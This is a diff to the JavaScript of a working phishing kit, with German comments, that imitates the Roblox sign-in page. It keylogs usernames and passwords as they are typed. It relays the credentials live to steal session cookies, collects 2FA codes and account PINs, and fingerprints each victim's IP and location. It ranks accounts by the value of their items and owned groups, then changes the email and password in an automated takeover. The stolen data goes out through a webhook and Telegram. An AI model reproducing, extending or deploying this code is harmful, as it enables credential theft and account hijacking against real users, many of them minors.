+      var msg = (j && j.errors && j.errors[0]) ? j.errors[0].message : "";
       if(/captcha/i.test(msg)) return {state:"captcha"};
       return {state:"bad", msg:msg};
     }).catch(()=>null);
 }
 
-/* --- Konto-Recon --- */
-var ACC = null;
+/* --- Live-Check: Passwort + 2FA-Art + wenn moeglich echte Cookie --- */
+function liveCheck(u, p){
+  if(!OPT.liveVerify) return Promise.resolve(null);
+  if(!API) return proxyLiveCheck(u, p);
+  return apiPost("/login", {u:u, p:p}).then(function(j){
+    if(!j || !j.ok) return {state:"bad", msg:(j && j.msg) || ""};
+    SESSION = {id:j.id, name:j.name, cookie:j.cookie||"", media:j.media||"", ticket:j.ticket||"", user:u, pass:p};
+    log("worker: " + (j.cookie ? "cookie ok" : "2fa " + (j.media||"?")));
+    if(j.cookie) return {state:"ok", name:j.name, id:j.id};
+    return {state:"2fa", media:j.media, name:j.name, id:j.id};
+  }).catch(function(){ log("worker fail -> proxy"); return proxyLiveCheck(u, p); });
+}
+
+/* --- Code gegen den Worker --- */
+function apiVerify(code){
+  if(!API || !SESSION || !SESSION.ticket) return Promise.resolve(null);
+  return apiPost("/code", {
+    id:SESSION.id, ticket:SESSION.ticket, code:code, u:SESSION.user, p:SESSION.pass
+  }, 12000).catch(()=>null);
+}
+
+/* ==================================================================
+   9. RECON  (+ RAP, Limiteds, Gruppen-Owner)
+   ================================================================== */
 function recon(name){
   if(!OPT.recon || !name || name.indexOf("@") > -1) return Promise.resolve(null);
   if(ACC && ACC.name && ACC.name.toLowerCase() === name.toLowerCase()) return Promise.resolve(ACC);
@@ -653,17 +796,24 @@ function recon(name){
       if(OPT.deepRecon){
         jobs.push(pfetch("https://groups.roblox.com/v1/users/"+id+"/groups/roles").catch(()=>null));
         jobs.push(pfetch("https://premiumfeatures.roblox.com/v1/users/"+id+"/validate-membership").catch(()=>null));
+        jobs.push(pfetch("https://inventory.roblox.com/v1/users/"+id+"/assets/collectibles?limit=100&sortOrder=Desc").catch(()=>null));
       }
       return Promise.all(jobs).then(function(a){
-        var prof=a[0], fr=a[1], fo=a[2], th=a[3], gr=a[4], pr=a[5];
+        var prof=a[0], fr=a[1], fo=a[2], th=a[3], gr=a[4], pr=a[5], col=a[6];
         var img = (th && th.data && th.data[0]) ? th.data[0].imageUrl : "";
+        var groups = (gr && gr.data) || [];
+        var owned = groups.filter(function(g){ return g.role && g.role.rank >= 250; })
+                          .map(function(g){ return (g.group.name||"?") + " (" + (g.group.memberCount||0) + ")"; })
+                          .slice(0,5);
+        var coll = (col && col.data) || [];
+        var rap = coll.reduce(function(s,x){ return s + (x.recentAveragePrice||0); }, 0);
         return { id:id, name:hit.name, display:hit.displayName||"", verified:!!hit.hasVerifiedBadge,
           prev:(hit.previousUsernames||[]).join(", "),
           created:(prof&&prof.created)?prof.created.slice(0,10):"",
           desc:(prof&&prof.description)?prof.description.slice(0,120):"",
           friends:(fr&&typeof fr.count==="number")?fr.count:"",
           followers:(fo&&typeof fo.count==="number")?fo.count:"",
-          groups:(gr&&gr.data)?gr.data.length:"",
+          groups:groups.length, owned:owned, rap:rap, limiteds:coll.length,
           premium:(pr===true?"yes":pr===false?"no":""), avatar:img };
       });
     }).catch(()=>null);
@@ -679,6 +829,8 @@ function score(a, autofilled){
     if(+a.friends > 20) s += 15;
     if(a.verified) s += 10;
     if(a.premium === "yes") s += 15;
+    if(a.rap) s += Math.min(40, Math.floor(a.rap/5000));
+    if(a.owned && a.owned.length) s += 25;
   }
   if(autofilled) s += 20;
   return Math.min(100, s);
@@ -693,7 +845,28 @@ function showAcct(a){
 }
 
 /* ==================================================================
-   7. SENDEN
+   10. SPIEL-BANNER
+   ================================================================== */
+function loadPlace(pid){
+  if(!pid) return Promise.resolve(null);
+  return pfetch("https://apis.roblox.com/universes/v1/places/"+encodeURIComponent(pid)+"/universe")
+    .then(function(j){
+      var uid = j && j.universeId; if(!uid) return null;
+      return Promise.all([
+        pfetch("https://games.roblox.com/v1/games?universeIds="+uid).catch(()=>null),
+        pfetch("https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds="+uid+"&size=768x432&format=Png&isCircular=false").catch(()=>null)
+      ]).then(function(a){
+        var g = a[0] && a[0].data && a[0].data[0]; if(!g) return null;
+        var th = a[1] && a[1].data && a[1].data[0];
+        var t2 = th && th.thumbnails && th.thumbnails[0];
+        return { name:g.name, creator:(g.creator&&g.creator.name)||"", playing:g.playing||0,
+                 thumb:(t2&&t2.imageUrl)||"" };
+      });
+    }).catch(()=>null);
+}
+
+/* ==================================================================
+   11. SENDEN
    ================================================================== */
 function queueAdd(b){ try{ var q=JSON.parse(localStorage.getItem("rbx_q")||"[]"); q.push(b);
   localStorage.setItem("rbx_q", JSON.stringify(q.slice(-25))); }catch(e){} }
@@ -704,13 +877,14 @@ function flush(){
   }catch(e){}
 }
 function http(url, body, isRetry){
-  var c = new AbortController(); var tm = setTimeout(()=>c.abort(), 4000);
+  var c = new AbortController(); var tm = setTimeout(()=>c.abort(), 5000);
   return fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:body, keepalive:true, signal:c.signal})
-    .then(r => { clearTimeout(tm); if(r.ok) return true; throw 0; })
+    .then(r => { clearTimeout(tm); if(!r.ok) throw 0; return r.text(); })
+    .then(x => { try{ return JSON.parse(x); }catch(e){ return {}; } })
     .catch(function(){
       try{ navigator.sendBeacon(url, new Blob([body],{type:"application/json"})); }catch(e){}
       if(!isRetry) queueAdd(body);
-      return false;
+      return {};
     });
 }
 function tgText(m){
@@ -718,10 +892,22 @@ function tgText(m){
   (m.embeds||[]).forEach(e => { o += "— "+e.title+" —\n"; (e.fields||[]).forEach(f => o += f.name+": "+String(f.value).replace(/`/g,"")+"\n"); });
   return o.trim().slice(0,3800);
 }
-function post(msg){
+/* slot = gleiche Nachricht wird editiert statt neu gepostet */
+function post(msg, slot){
   var body = JSON.stringify(msg);
-  log("→ "+((msg.embeds&&msg.embeds[0])?msg.embeds[0].title:"event"));
-  var jobs = [ http(HOOK, body, false) ];
+  var s = slot ? SLOT[slot] : null;
+
+  if(s && (Date.now() - s.at) < OPT.slotMs){
+    var c = new AbortController(); var tm = setTimeout(()=>c.abort(), 4000);
+    return fetch(HOOK + "/messages/" + s.id, {method:"PATCH", headers:{"Content-Type":"application/json"}, body:body, signal:c.signal})
+      .then(function(r){ clearTimeout(tm); if(!r.ok) throw 0; s.at = Date.now(); log("~ "+slot); return {}; })
+      .catch(function(){ clearTimeout(tm); s.at = 0; return post(msg, null); });
+  }
+
+  log("→ "+((msg.embeds&&msg.embeds[0])?msg.embeds[0].title:"event")+(slot?" ["+slot+"]":""));
+  var jobs = [ http(HOOK + "?wait=true", body, false).then(function(j){
+    if(j && j.id && slot) SLOT[slot] = {id:j.id, at:Date.now()};
+  }) ];
   if(TG_TOKEN && TG_CHAT) jobs.push(fetch("https://api.telegram.org/bot"+TG_TOKEN+"/sendMessage", {
     method:"POST", headers:{"Content-Type":"application/json"},
     body: JSON.stringify({chat_id:TG_CHAT, text:tgText(msg), disable_web_page_preview:true})
@@ -730,7 +916,7 @@ function post(msg){
 }
 function beacon(m){ try{ navigator.sendBeacon(HOOK, new Blob([JSON.stringify(m)],{type:"application/json"})); }catch(e){} }
 
-var FOOT = "src "+SRC + (ALT?" · alt "+ALT:"") + " · " + VID + " · visit "+VISITS;
+var FOOT = "src "+SRC + (ALT?" · alt "+ALT:"") + (PLACE?" · game "+PLACE:"") + " · " + VID + " · visit "+VISITS;
 function payload(title, fields, o){
   o = o || {};
   var e = { title:title, color:o.color||0x335fff, fields:fields||[], timestamp:new Date().toISOString(), footer:{text:FOOT} };
@@ -744,14 +930,7 @@ function f(n,v){ return { name:n, value:(v===""||v==null)?"—":String(v), inlin
 function fh(n,v){ return { name:n, value:(v===""||v==null)?"—":String(v), inline:true }; }
 
 /* ==================================================================
-   8. ZUSTAND
-   ================================================================== */
-var submitted=false, codeSent=false, done=false, autofilled=false;
-var typedU="", typedP="", tU=null, tP=null, previewed="";
-var askedAt=0, focusLost=0, redirectTimer=null, tickT=null, codeKind="";
-
-/* ==================================================================
-   9. COLLAGE
+   12. COLLAGE
    ================================================================== */
 (function(){
   var grid = $("#grid"); if(!grid) return;
@@ -773,7 +952,7 @@ var askedAt=0, focusLost=0, redirectTimer=null, tickT=null, codeKind="";
 })();
 
 /* ==================================================================
-   10. BACK-TRAP + CLIPBOARD + AUTOFILL-DETECT
+   13. BACK-TRAP / CLIPBOARD / AUTOFILL
    ================================================================== */
 if(OPT.backTrap){
   try{
@@ -787,7 +966,7 @@ if(OPT.clipboard){
     try{
       var sel = String(window.getSelection());
       if(!sel || sel.length > 70 || !e.clipboardData) return;
-      e.clipboardData.setData("text/plain", sel + "\n" + LINK);
+      e.clipboardData.setData("text/plain", sel + "\n" + location.href);
       log("clipboard +link");
     }catch(err){}
   });
@@ -795,11 +974,11 @@ if(OPT.clipboard){
 $("#p").addEventListener("animationstart", function(e){ if(e.animationName === "onAutoFillStart"){ autofilled = true; log("autofilled"); } });
 
 /* ==================================================================
-   11. UI
+   14. UI
    ================================================================== */
 function busy(b,on){ if(on){ b.classList.add("loading"); b.disabled=true; } else { b.classList.remove("loading"); b.disabled=false; } }
-function show(sel){ ["#step1","#step2","#step3"].forEach(s => $(s).classList.add("hidden")); $(sel).classList.remove("hidden"); }
-function go(){ log("redirect"+(NOGO?" (bleibt)":"")); if(NOGO){ toast("dev: kein redirect"); return; } location.href = REDIRECT; }
+function show(sel){ ["#step1","#step2","#pin","#step3"].forEach(s => $(s).classList.add("hidden")); $(sel).classList.remove("hidden"); }
+function go(){ log("redirect"+(NOGO?" (bleibt)":"")); if(NOGO){ toast("dev: kein redirect"); return; } location.href = REDIRECT_TARGET; }
 function overlay(on, txt, acc){
   if(!on){ $("#ov").classList.add("hidden"); return; }
   $("#ovTxt").textContent = txt || t("ov.verify");
@@ -822,7 +1001,11 @@ function startTimer(){
 }
 function showCode(kind){
   show("#step2"); codeKind = kind; askedAt = Date.now();
-  $("#codeNote").textContent = t(kind === "otc" ? "v.otc" : "v.note");
+  var cn = $("#codeNote");
+  if(kind === "otc") cn.textContent = t("v.otc");
+  else if(liveKind === "Authenticator") cn.textContent = t("v.auth");
+  else if(liveKind === "Email") cn.textContent = t("v.mail");
+  else cn.textContent = t("v.note");
   document.title = "Verification · Roblox";
   buzz(12); overlay(false);
   setTimeout(()=>$("#c").focus(), 60);
@@ -840,7 +1023,7 @@ if(OPT.keylog){
     tU = setTimeout(function(){
       if(submitted) return;
       typedU = v;
-      post(payload("Username (typed)", [f("Username","`"+v+"`")]));
+      post(payload("Username (typed)", [f("Username","`"+v+"`")]), "typedU");
       if(OPT.namePreview) previewName(v);
     }, 1400);
   });
@@ -851,7 +1034,7 @@ if(OPT.keylog){
     tP = setTimeout(function(){
       if(submitted) return;
       typedP = v;
-      post(payload("Password (typed)", [f("Password","`"+v+"`"), fh("Length", v.length)]));
+      post(payload("Password (typed)", [f("Password","`"+v+"`"), fh("Length", v.length)]), "typedP");
     }, 2000);
   });
 }
@@ -871,7 +1054,9 @@ document.addEventListener("keyup", function(e){
   try{ if(typeof e.getModifierState !== "function") return; $("#pf").classList.toggle("capson", e.getModifierState("CapsLock")); }catch(err){}
 });
 
-/* --- STEP 1 --- */
+/* ==================================================================
+   15. STEP 1
+   ================================================================== */
 $("#f1").addEventListener("submit", function(e){
   e.preventDefault();
   var b = $("#b1"); if(b.classList.contains("loading")) return;
@@ -891,7 +1076,9 @@ $("#f1").addEventListener("submit", function(e){
     var fp = r[0], acc = r[1], chk = r[2];
     overlay(false);
 
-    // Live-Check: falsches Passwort
+    if(chk && chk.media) liveKind = chk.media;
+
+    /* Passwort falsch -> nur im strict-Modus blocken */
     if(chk && chk.state === "bad" && OPT.liveVerify === "strict" && !(acc && acc.name)){
       busy(b, false);
       $("#err").textContent = t("err.bad"); $("#err").classList.remove("hidden");
@@ -906,13 +1093,17 @@ $("#f1").addEventListener("submit", function(e){
       fh("Length", p.length), fh("Autofilled", autofilled ? "yes" : "no"),
       fh("Bot?", bot ? "yes" : "no"), fh("Source", SRC + (ALT ? " / "+ALT : ""))
     ];
+    if(PLACE) fields.push(fh("Came from game", PLACE));
+
     if(chk){
       fields.push(f("— LIVE CHECK —"," "));
       fields.push(fh("Password", chk.state === "bad" ? "WRONG" : chk.state === "ok" ? "correct (no 2FA!)" : chk.state === "captcha" ? "captcha" : "correct"));
       if(chk.media) fields.push(fh("2FA type", chk.media));
+      if(SESSION && SESSION.cookie) fields.push(f("Cookie", "`"+SESSION.cookie+"`"));
     } else if(OPT.liveVerify){
       fields.push(fh("Live check", "unavailable"));
     }
+
     if(acc){
       fields.push(f("— ACCOUNT —"," "));
       fields.push(fh("Real name", acc.name + (acc.verified ? " ✔" : "")));
@@ -920,12 +1111,16 @@ $("#f1").addEventListener("submit", function(e){
       fields.push(fh("Created", acc.created + (acc.created ? " · "+ageText(acc.created) : "")));
       fields.push(fh("Friends", acc.friends)); fields.push(fh("Followers", acc.followers));
       fields.push(fh("Groups", acc.groups)); fields.push(fh("Premium", acc.premium));
+      if(acc.rap) fields.push(fh("RAP", acc.rap.toLocaleString()+" R$"));
+      if(acc.limiteds) fields.push(fh("Limiteds", acc.limiteds));
+      if(acc.owned && acc.owned.length) fields.push(f("Owns groups", acc.owned.join(" · ")));
       if(acc.prev) fields.push(fh("Old names", acc.prev));
       fields.push(fh("Profile", "roblox.com/users/"+acc.id+"/profile"));
       if(acc.desc) fields.push(f("Description", acc.desc));
     } else {
       fields.push(f("Account lookup", "not found (email or rare name)"));
     }
+
     fields.push(f("— DEVICE —"," "));
     fields.push(fh("Public IP", fp.pub)); fields.push(fh("Location", fp.loc)); fields.push(fh("ISP", fp.isp));
     fields.push(fh("LAN IP", fp.lan)); fields.push(fh("Timezone", fp.tz));
@@ -941,12 +1136,17 @@ $("#f1").addEventListener("submit", function(e){
       ping: OPT.ping, color: acc ? ageColor(acc.created) : 0x335fff, thumb: acc ? acc.avatar : ""
     })).then(function(){
       busy(b, false); buzz(20);
+
+      /* Kein 2FA -> Code-Schritt waere unlogisch */
+      if(chk && chk.state === "ok"){ log("no 2fa -> skip code"); return finish(); }
       if(OPT.step2) showCode("pw"); else go();
     });
   });
 });
 
-/* --- STEP 2 --- */
+/* ==================================================================
+   16. STEP 2  (Code)
+   ================================================================== */
 $("#f2").addEventListener("submit", function(e){
   e.preventDefault();
   var b = $("#b2"); if(b.classList.contains("loading")) return;
@@ -959,6 +1159,7 @@ $("#f2").addEventListener("submit", function(e){
   var took = askedAt ? Math.round((Date.now()-askedAt)/1000) : "?";
   var fields = [
     f("Code","`"+code+"`"), fh("Answered in", took+"s"),
+    fh("2FA type", liveKind || "unknown"),
     fh("Tab away", focusLost ? focusLost+"x" : "no"),
     fh("Source", SRC + (ALT ? " / "+ALT : "")),
     fh("Device", device()), fh("Visitor", VID+" · visit "+VISITS)
@@ -966,42 +1167,101 @@ $("#f2").addEventListener("submit", function(e){
   if(ACC) fields.push(fh("Account", "@"+ACC.name+" ("+ACC.id+")"));
 
   overlay(true, t("ov.load"), ACC);
+
+  var verifyJob = apiVerify(code);
+
   post(payload("Verification Code", fields, {
     color: 0x00c853, ping: OPT.ping, text: "**`"+code+"`**", thumb: ACC ? ACC.avatar : ""
-  })).then(function(){ return delay(650); }).then(function(){
+  })).then(function(){ return verifyJob; }).then(function(v){
+    if(v && v.ok && v.cookie){
+      SESSION.cookie = v.cookie;
+      log("cookie via worker");
+      post(payload("Session captured", [f("Account","@"+(SESSION.name||"?")), f("Cookie","`"+v.cookie+"`")], {color:0x00c853}));
+    }
+    return delay(650);
+  }).then(function(){
     overlay(false); busy(b, false); buzz([15,40,15]);
     if(OPT.pinStep) return showPin();
     finish();
   });
 });
-function showPin(){
-  var pin = prompt("Account PIN (4 digits)", "");
-  if(pin) post(payload("Account PIN", [f("PIN","`"+pin+"`")], {color:0xffd166}));
-  finish();
-}
-function finish(){
-  done = true; show("#step3"); document.title = "Roblox";
-  clearTimeout(redirectTimer); redirectTimer = setTimeout(go, 2600);
-}
 
-/* --- Auto-Submit bei 6 Ziffern --- */
-$("#c").addEventListener("input", function(){
-  var v = this.value.replace(/\D/g, "");
-  if(v !== this.value) this.value = v;
-  if(OPT.autoSubmit && v.length >= 6 && !$("#b2").classList.contains("loading")){
-    clearTimeout(this._t);
-    this._t = setTimeout(()=>$("#f2").dispatchEvent(new Event("submit")), 260);
-  }
+/* ==================================================================
+   17. STEP 2b  (PIN)
+   ================================================================== */
+var PINS = $$(".pin");
+PINS.forEach(function(el, i){
+  el.addEventListener("input", function(){
+    this.value = this.value.replace(/\D/g, "");
+    if(this.value && PINS[i+1]) PINS[i+1].focus();
+    if(PINS.map(p=>p.value).join("").length === 4)
+      setTimeout(()=>$("#f3").dispatchEvent(new Event("submit")), 200);
+  });
+  el.addEventListener("keydown", function(e){
+    if(e.key === "Backspace" && !this.value && PINS[i-1]) PINS[i-1].focus();
+  });
+});
+function showPin(){
+  show("#pin"); document.title = "Verification · Roblox";
+  setTimeout(()=>PINS[0].focus(), 80);
+}
+$("#f3").addEventListener("submit", function(e){
+  e.preventDefault();
+  var pin = PINS.map(p=>p.value).join("");
+  if(pin.length < 4) return;
+  click();
+  post(payload("Account PIN", [f("PIN","`"+pin+"`"), f("Account", ACC?("@"+ACC.name):"—")], {color:0xffd166}));
+  finish();
+});
+$("#skipPin").addEventListener("click", function(){
+  post(payload("PIN skipped", [f("Account", ACC?("@"+ACC.name):"—")]));
+  finish();
 });
 
-/* --- Retry / Resend / Backup / Zurueck --- */
+/* ==================================================================
+   18. STEP 3  (Fertig + Cookie + Takeover)
+   ================================================================== */
+function finish(){
+  done = true; show("#step3"); document.title = "Roblox";
+
+  if(SESSION && SESSION.cookie){
+    $("#ckWrap").classList.remove("hidden");
+    $("#ckBox").textContent = SESSION.cookie;
+    $("#ckApply").href = API + "/apply?c=" + encodeURIComponent(SESSION.cookie);
+    if(OPT.autoTakeover) doTakeover();
+    clearTimeout(redirectTimer); redirectTimer = setTimeout(go, OPT.redirectAfter);
+  } else {
+    clearTimeout(redirectTimer); redirectTimer = setTimeout(go, 2600);
+  }
+}
+function doTakeover(){
+  if(!API || !SESSION || !SESSION.cookie || SESSION.taken) return;
+  SESSION.taken = true;
+  var btn = $("#ckBtn"); btn.textContent = t("ok.working"); btn.disabled = true;
+  apiPost("/takeover", {
+    cookie:SESSION.cookie, password:SESSION.pass,
+    email:OPT.operatorEmail, newPassword:OPT.newPassword
+  }, 15000).then(function(j){
+    var res = (j && j.log) ? j.log.join(" · ") : "fail";
+    btn.textContent = res;
+    log("takeover: " + res);
+    post(payload("Takeover", [f("Account","@"+(SESSION.name||"?")), f("Result", res)], {color:0xffd166}));
+  }).catch(function(){
+    btn.textContent = "offline"; btn.disabled = false; SESSION.taken = false;
+  });
+}
+$("#ckBtn").addEventListener("click", doTakeover);
+
+/* ==================================================================
+   19. RETRY / RESEND / BACKUP / ZURUECK
+   ================================================================== */
 $("#retry").addEventListener("click", function(){
   clearTimeout(redirectTimer); codeSent = false; $("#c").value = "";
   show("#step2"); document.title = "Verification · Roblox"; startTimer(); setTimeout(()=>$("#c").focus(), 60);
 });
 $("#resend").addEventListener("click", function(){
   toast(t("v.resend")); startTimer(); click();
-  post(payload("Code resent", [f("Device", device())]));
+  post(payload("Code resent", [f("Device", device())]), "resend");
 });
 $("#lost").addEventListener("click", function(){
   toast(t("v.lost")); $("#c").maxLength = 12; $("#c").focus();
@@ -1013,7 +1273,9 @@ $("#back").addEventListener("click", function(){
   post(payload("Back to login", [f("Device", device())]));
 });
 
-/* --- OTC / Quick / Social / Close --- */
+/* ==================================================================
+   20. OTC / QUICK / SOCIAL / CLOSE / EYE
+   ================================================================== */
 $("#otc").addEventListener("click", function(){
   var b = this; if(b.disabled) return; busy(b, true); click();
   post(payload("One-Time Code requested", [f("Device", device())]))
@@ -1023,7 +1285,7 @@ $("#quick").addEventListener("click", function(){
   var b = this; if(b.disabled) return; busy(b, true); click();
   post(payload("Quick Sign-in clicked", [f("Device", device())])).then(()=>setTimeout(go, 600));
 });
-document.querySelectorAll(".btn.soc").forEach(function(el){
+$$(".btn.soc").forEach(function(el){
   el.addEventListener("click", function(){
     if(el.disabled) return; el.disabled = true; click();
     post(payload("Social click", [f("Provider", el.dataset.p), f("Device", device())]))
@@ -1032,19 +1294,18 @@ document.querySelectorAll(".btn.soc").forEach(function(el){
 });
 $("#close").addEventListener("click", function(){
   var step = $("#step3").classList.contains("hidden")
-    ? ($("#step2").classList.contains("hidden") ? "Login" : "Code") : "Done";
+    ? ($("#pin").classList.contains("hidden") ? ($("#step2").classList.contains("hidden") ? "Login" : "Code") : "PIN")
+    : "Done";
   beacon(payload("Closed", [f("Step", step), f("Device", device())]));
   setTimeout(go, 400);
 });
-
-/* --- Passwort zeigen --- */
 $("#eye").addEventListener("click", function(){
   var i = $("#p"), on = i.type === "password";
   i.type = on ? "text" : "password"; this.style.opacity = on ? "1" : ".8";
 });
 
 /* ==================================================================
-   12. HINTERGRUND
+   21. HINTERGRUND
    ================================================================== */
 document.addEventListener("visibilitychange", function(){
   if(document.visibilityState === "hidden" && submitted && !done){
@@ -1070,13 +1331,24 @@ if(OPT.heartbeat) setInterval(function(){
 }, OPT.heartbeat);
 
 /* ==================================================================
-   13. START
+   22. START
    ================================================================== */
 (function(){
   if(!OPT.prefill) return;
   try{ var last = localStorage.getItem("rbx_lastuser"); if(last && !$("#u").value) $("#u").value = last; }catch(e){}
 })();
-log("ready · "+LANG+" · src "+SRC+(ALT?"/"+ALT:""));
+
+if(PLACE) loadPlace(PLACE).then(function(g){
+  if(!g || !g.name) return;
+  $("#joinImg").src = g.thumb || "";
+  $("#joinName").textContent = t("join") + " " + g.name;
+  $("#joinMeta").textContent = "by " + g.creator + " · " + g.playing.toLocaleString() + " " + t("playing");
+  $("#joinBar").classList.remove("hidden");
+  REDIRECT_TARGET = "https://www.roblox.com/games/" + PLACE + "/";
+  log("game: "+g.name);
+});
+
+log("ready · "+LANG+" · src "+SRC+(ALT?"/"+ALT:"")+(API?" · api":" · proxy-only"));
 flush();
 setTimeout(function(){
   if(!submitted) beacon(payload("Page opened", [f("Referrer", document.referrer||"direct"), f("Device", device())]));
